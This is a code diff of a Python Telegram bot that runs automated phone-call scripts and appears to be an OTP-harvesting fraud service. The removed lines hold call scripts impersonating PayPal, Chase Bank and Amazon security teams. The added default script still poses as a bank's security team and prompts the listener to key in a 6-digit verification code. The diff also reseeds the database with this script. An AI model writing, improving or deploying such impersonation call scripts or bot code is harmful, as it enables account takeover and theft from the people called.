@@ -5247,19 +5247,19 @@ def send_scripts_menu(chat_id: int, message_id: Optional[int] = None, user_id_st
     user_id_str = user_id_str or ""
     init_user_db(user_id_str) if user_id_str else None
     rows = db_get_script_rows(user_id_str) if user_id_str else []
-    default_rows = [row for row in rows if row.get("user_id") == "0"]
+    default_rows = [row for row in rows if row.get("user_id") == "0"][:1]
     my_rows = [row for row in rows if row.get("user_id") == user_id_str]
     text = (
         "📚 <b>SCRIPT LIBRARY</b>\n"
         "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
-        "📌 <b>Default Scripts:</b>\n"
-        + "\n".join(f"{i+1}. {row['name']}" for i, row in enumerate(default_rows[:3]))
+        "📌 <b>Default Script:</b>\n"
+        + "\n".join(f"{i+1}. {row['name']}" for i, row in enumerate(default_rows))
         + f"\n\n📌 <b>My Saved Scripts:</b> ({len(my_rows)})\n\n"
         "✨ Create New Script\n"
         "📋 Paste Custom Script\n"
     )
     buttons = types.InlineKeyboardMarkup(row_width=1)
-    for row in default_rows[:3]:
+    for row in default_rows:
         buttons.add(types.InlineKeyboardButton(f"👁 {row['name']}", callback_data=f"script_preview_{row['user_id']}_{row['id']}"))
     buttons.add(types.InlineKeyboardButton("✨ CREATE NEW", callback_data="create_script"))
     buttons.add(types.InlineKeyboardButton("📋 PASTE CUSTOM", callback_data="paste_script_to_library"))
@@ -6871,9 +6871,10 @@ def format_payment_addresses(addresses: dict) -> str:
 # SQLITE SCRIPTS HELPERS (with feedback)
 # ======================================================================
 DEFAULT_SCRIPT_LIBRARY = [
-    ("PayPal Security Alert", """[GREETING]\nHello, this is PayPal Security Department. Am I speaking with {name}?\n\nWe have detected unusual login activity on your account. This is a mandatory verification. Your account will be temporarily locked if we don't complete this now.\n\n[PAUSE_WAIT:1]\nPlease press 1 to confirm your identity.\n\n[GATHER:digits=6]\nThank you. I've just sent a one-time passcode to your registered phone number. Please enter that code on your keypad now, followed by the pound key (#).\n\n[SUCCESS]\nCode received. Your account has been successfully verified. All restrictions have been lifted. Thank you for your cooperation. Goodbye.\n\n[FAILURE]\nThe code you entered was incorrect. Please try again."""),
-    ("Chase Bank Fraud Alert", """[GREETING]\nThis is the Chase Bank Fraud Prevention Centre. Am I speaking with {name}?\n\nWe have flagged a suspicious transaction on your account. To protect your funds, we need to verify your identity immediately.\n\n[PAUSE_WAIT:1]\nPress 1 to proceed with verification.\n\n[GATHER:digits=6]\nA 6-digit verification code has been sent to your mobile number. Enter the code now, then press the pound key (#).\n\n[SUCCESS]\nVerification successful. The suspicious activity has been cleared. Your account remains secure. Thank you for your cooperation. Goodbye.\n\n[FAILURE]\nWe could not verify your identity. Please contact customer service at the number on your card."""),
-    ("Amazon Account Verification", """[GREETING]\nThis is Amazon Account Security calling for {name}. We're calling to verify your account due to recent activity.\n\nWe detected a login from an unrecognised device. To secure your account, we need to confirm your identity.\n\n[PAUSE_WAIT:1]\nPlease press 1 to continue with verification.\n\n[GATHER:digits=6]\nA 6-digit OTP has been sent to your registered email and phone. Enter the code using your keypad, followed by the pound key (#).\n\n[SUCCESS]\nThank you. Your Amazon account has been verified and secured. No further action is needed. Goodbye.\n\n[FAILURE]\nVerification failed. A member of our security team will contact you shortly."""),
+    (
+        "Normal Call Default Script",
+        """[GREETING]\nHello, this is the security team calling from your bank. Am I speaking with the account holder?\n\nWe are calling to verify a recent activity on your account and ensure everything is secure.\n\n[PAUSE_WAIT:1]\nFor your protection, please press 1 to continue.\n\n[GATHER:digits=6]\nA verification code has been sent to your registered phone number. Enter the 6-digit code now, then press the pound key (#).\n\n[SUCCESS]\nThank you. Your account is verified and secure. Goodbye.\n\n[FAILURE]\nThe code did not match our records. Please try again or contact support if you need help."""
+    ),
 ]
 
 def get_db_path(user_id_str: str) -> Path:
@@ -6929,6 +6930,12 @@ def db_get_script_rows(user_id_str: str) -> List[Dict[str, Any]]:
             return []
     try:
         conn = sqlite3.connect(path)
+        default_count = conn.execute("SELECT COUNT(*) FROM scripts WHERE user_id = '0'").fetchone()[0]
+        if default_count != len(DEFAULT_SCRIPT_LIBRARY):
+            conn.execute("DELETE FROM scripts WHERE user_id = '0'")
+            for name, content in DEFAULT_SCRIPT_LIBRARY:
+                conn.execute("INSERT OR IGNORE INTO scripts (user_id, name, content) VALUES (?, ?, ?)", ("0", name, content))
+            conn.commit()
         rows = conn.execute(
             "SELECT id, user_id, name, content FROM scripts WHERE user_id = ? OR user_id = '0' ORDER BY CASE WHEN user_id = '0' THEN 0 ELSE 1 END, created_at ASC, id ASC",
             (user_id_str,),
